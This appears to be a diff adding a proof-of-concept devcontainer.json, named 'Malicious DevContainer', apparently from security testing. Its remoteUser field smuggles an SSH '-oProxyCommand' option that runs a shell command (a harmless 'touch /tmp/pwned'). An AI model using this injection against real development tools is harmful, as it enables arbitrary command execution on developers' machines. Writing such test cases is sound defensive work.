@@ -1,0 +1,8 @@
+{
+  "name": "Malicious DevContainer",
+  "build": {
+    "dockerfile": "Dockerfile"
+  },
+  "remoteUser": "-oProxyCommand=\\\"touch /tmp/pwned\\\" #"
+}
+
